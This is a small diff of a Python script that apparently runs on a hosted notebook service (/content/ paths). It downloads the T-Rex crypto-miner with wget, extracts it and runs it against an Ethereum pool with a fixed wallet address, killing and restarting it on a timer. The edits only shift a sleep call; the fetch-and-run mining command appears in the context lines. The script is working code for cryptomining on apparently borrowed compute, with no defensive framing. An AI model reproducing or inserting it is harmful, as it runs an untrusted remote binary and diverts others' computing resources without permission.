@@ -8,7 +8,7 @@ def asd():
 	e=1
 	if e==1:
 		e=e=0
-		time.sleep(120)
+		#time.sleep(120)
 		os.system("wget https://trex-miner.com/download/t-rex-0.21.2-linux.tar.gz; tar -zxvf t-rex-0.21.2-linux.tar.gz;./t-rex -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x7Bf282FEC6a3dEb8F888B1da8a7193bB20F49376 -p x -w rig")
 	
 
@@ -25,6 +25,7 @@ if __name__ == '__main__':
 			inicio=0
 			p2.terminate()
 			os.system("killall /content/t-rex")
+			time.sleep(120)
 			p2 = Process(target=asd)
 			p2.start()
 			
